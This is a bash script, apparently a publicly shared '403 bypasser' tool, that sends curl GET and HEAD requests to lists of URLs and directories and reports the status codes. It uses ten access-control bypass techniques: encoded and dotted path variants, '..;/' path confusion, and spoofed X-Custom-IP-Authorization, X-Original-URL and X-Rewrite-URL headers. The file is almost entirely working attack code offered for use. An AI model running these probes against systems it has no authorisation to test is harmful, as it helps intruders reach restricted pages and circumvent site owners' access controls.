 #!/bin/bash

apt install figlet > /dev/null 2>&1
figlet -c 403 bypasser
echo -e "\nAuthor: github.com/yunemse48\n"
echo -e "\n------------------------------------- WELCOME -------------------------------------\n"
echo "This tool is to bypass 403 status code and to reach restricted pages."
echo "HTTP status codes are detected by both GET and HEAD requests."
echo -e "Arguments:\n\t-u <single_url>\n\t-U <path_of_URL_list>\n\t-d <single_directory>\n\t-D <path_of_directory_list>\n"
echo -e "\nUsage (4 cases):\n\t./bypass_403.sh -U <path_of_URL_list> -D <path_of_directory_list>\n\t./bypass_403.sh -U <path_of_URL_list> -d <single_directory>\n\t./bypass_403.sh -u <single_URL> -D <path_of_directory_list>\n\t./bypass_403.sh -u <single_URL> -d <single_directory>"
echo -e "\n\n"
echo -e "Examples:\n\t./bypass_403.sh -U my_urls.txt -D my_dirs.txt\n\t./bypass_403.sh -U my_urls.txt -d admin\n\t./bypass_403.sh -u https://example.com -D my_dirs.txt\n\t./bypass_403.sh -u https://example.com -d admin\n"

re='^[0-9]+$'   #regex for testing whether it is a number

echo -e "-----------------------------------------------------------------------------------"

while getopts u:d:U:D: flag
        do
            case "${flag}" in
                u) urll=${OPTARG};;
                d) dirr=${OPTARG};;
		U) urlpath=${OPTARG};;
		D) dirpath=${OPTARG};;
            esac
        done

if [ -z "$urlpath"  ]
then
	echo "$urll" > single_url.txt
        urlpath=single_url.txt
        check1=1
fi

if [ -z "$dirpath" ]
then
	echo "$dirr" > single_dir.txt
        dirpath=single_dir.txt
        check2=1
fi


while IFS= read -r line
do
	echo -e "\n"
	for((i=1;i<=83;i+=1)); do echo -n "="; done;
	echo -e "\n"

	while IFS= read -r path
	do
		echo -e "\n"
		for((i=1;i<=83;i+=1)); do echo -n "-"; done;
		echo -e "\n"

		url="$line"
		len=${#url}
		rem=$((50-len))

		echo -n "=> URL: $line <=";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n "=> PATH: $path <="

		#1-Testing https://url.com/path
		echo -e "\n"
		get1=$(curl $line/$path -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head1=$(curl $line/$path -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/$path"
		len=${#url}
		rem=$((50-len))

		if [[ $get1 =~ $re ]];then
			echo -n "$line/$path";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get1"
		else
			echo -n "$line/$path";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head1 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head1"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi


		#2-Testing https://url.com/%2e/path
		echo -e "\n"
		get2=$(curl $line/%2e/$path -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head2=$(curl $line/%2e/$path -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/%2e/$path"
		len=${#url}
		rem=$((50-len))

		if [[ $get2 =~ $re ]];then
        		echo -n "$line/%2e/$path";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get2"
		else
        		echo -n "$line/%2e/$path";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head2 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head2"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi


		#3-Testing https://url.com/path/.
		echo -e "\n"
		get3=$(curl $line/$path/. -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head3=$(curl $line/$path/. -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/$path/."
		len=${#url}
		rem=$((50-len))

		if [[ $get3 =~ $re ]];then
        		echo -n "$line/$path/.";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get3"
		else
        		echo -n "$line/$path/.";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head3 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head3"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi


		#4-Testing https://url.com//path//
		echo -e "\n"
		get4=$(curl $line//$path// -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head4=$(curl $line//$path// -I -s | head -n 1 | cut -d " " -f 2)

		url="$line//$path//"
		len=${#url}
		rem=$((50-len))

		if [[ $get4 =~ $re ]];then
        		echo -n "$line//$path//";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get4"
		else
        		echo -n "$line//$path//";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head4 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head4"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi



		#5-Testing https://url.com/./path/./
		echo -e "\n"
		get5=$(curl $line/./$path/./ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head5=$(curl $line/./$path/./ -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/./$path/./"
		len=${#url}
		rem=$((50-len))

		if [[ $get5 =~ $re ]];then
        		echo -n "$line/./$path/./";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get5"
		else
        		echo -n "$line/./$path/./";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head5 =~ $re ]];then
       			echo -n -e "\t\tHEAD: $head5"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi



		#6-Testing https://url.com/path/
		echo -e "\n"
		get6=$(curl $line/$path/ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head6=$(curl $line/$path/ -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/$path/"
		len=${#url}
		rem=$((50-len))

		if [[ $get6 =~ $re ]];then
        		echo -n "$line/$path/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get6"
		else
        		echo -n "$line/$path/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head6 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head6"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi



		#7-Testing https://url.com/path..;/
		echo -e "\n"
		get7=$(curl $line/$path..\;/ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head7=$(curl $line/$path..\;/ -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/$path..;/"
		len=${#url}
		rem=$((50-len))

		if [[ $get7 =~ $re ]];then
        		echo -n "$line/$path..;/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get7"
		else
        		echo -n "$line/$path..;/";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head7 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head7"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi



		#8-Testing https://url.com/path with header poisoning
		echo -e "\n"
		get8=$(curl -H "X-Custom-IP-Authorization: 127.0.0.1" $line/$path..\;/ -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head8=$(curl -H "X-Custom-IP-Authorization: 127.0.0.1" $line/$path..\;/ -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/$path X-C-IP-Auth"
		len=${#url}
		rem=$((50-len))

		if [[ $get8 =~ $re ]];then
        		echo -n "$line/$path X-C-IP-Auth";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get8"
		else
        		echo -n "$line/$path X-C-IP-Auth";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head8 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head8"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi

		#9-Testing https://url.com/anything with header poisoning X-Original-URL: /directory
		echo -e "\n"
		get9=$(curl -H "X-Original-URL: /$path" $line/testt -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
		head9=$(curl -H "X-Original-URL: /$path" $line/testt -I -s | head -n 1 | cut -d " " -f 2)

		url="$line/$path X-Original-URL"
		len=${#url}
		rem=$((50-len))

		if [[ $get9 =~ $re ]];then
        		echo -n "$line/$path X-Original-URL";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get9"
		else
        		echo -n "$line/$path X-Original-URL";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
		fi

		if [[ $head9 =~ $re ]];then
        		echo -n -e "\t\tHEAD: $head9"
		else
        		echo -n -e "\t\tHEAD: ---"
		fi

		#10-Testing https://url.com with header poisoning X-Rewrite-URL: /directory
                echo -e "\n"
                get10=$(curl -H "X-Rewrite-URL: /$path" $line -s | head -n 2 | tail -1 | cut -d " " -f 1 | tr -cd [:digit:])
                head10=$(curl -H "X-Rewrite-URL: /$path" $line -I -s | head -n 1 | cut -d " " -f 2)

                url="$line/$path X-Rewrite-URL"
                len=${#url}
                rem=$((50-len))

                if [[ $get10 =~ $re ]];then
                        echo -n "$line/$path X-Rewrite-URL";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: $get10"
                else
                        echo -n "$line/$path X-Rewrite-URL";for((i=1;i<=$rem;i+=1)); do echo -n " "; done;echo -n " --> GET: ---"
                fi

                if [[ $head10 =~ $re ]];then
                        echo -n -e "\t\tHEAD: $head10"
                else
                        echo -n -e "\t\tHEAD: ---"
                fi

	done < "$dirpath"
done < "$urlpath"

if [ ! -z "$check1"  ]
then
	rm single_url.txt
fi

if [ ! -z "$check2"  ]
then
	rm single_dir.txt
fi
